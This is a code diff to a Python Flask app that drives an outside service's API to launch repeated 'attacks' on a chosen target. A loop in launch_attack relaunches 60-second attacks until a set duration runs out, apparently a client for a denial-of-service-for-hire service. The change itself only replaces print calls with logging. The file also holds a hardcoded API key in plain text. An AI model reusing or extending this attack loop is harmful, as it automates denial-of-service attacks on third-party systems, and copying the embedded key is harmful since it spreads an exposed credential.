@@ -3,12 +3,17 @@ import requests
 import time
 import threading
 import os
+import logging
 
 app = Flask(__name__)
 
 # Configuration
 USER_API_KEY = "38698f04-75e1-4bb6-904e-17850e4ca52d"
 API_BASE_URL = "https://vire.cc/api/v1"
+
+# Set up logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 # API utility function
 def call_api(path: str, data: dict = None, method: str = 'GET') -> dict:
@@ -62,18 +67,18 @@ def launch_attack(target: str, total_duration: int) -> None:
                 # Launch a new attack
                 attack_response = call_api("start", data={"target": target, "time": 60, "method": "AI-TEMPEST"}, method='POST')
                 if attack_response["success"]:
-                    print(f"Attack launched on {target} with default time and method.")
+                    logger.info(f"Attack launched on {target} with default time and method.")
                 else:
-                    print(f"Failed to launch attack: {attack_response['error']}")
+                    logger.error(f"Failed to launch attack: {attack_response['error']}")
             else:
-                print("Waiting for the current attack to finish...")
+                logger.info("Waiting for the current attack to finish...")
                 time.sleep(10)  # Wait for 10 seconds before checking again
         else:
-            print(f"Failed to check status: {status_response['error']}")
+            logger.error(f"Failed to check status: {status_response['error']}")
 
         elapsed_time = time.time() - start_time
 
-    print("Total specified time has elapsed. Exiting the loop.")
+    logger.info("Total specified time has elapsed. Exiting the loop.")
 
 # Flask routes
 @app.route('/')
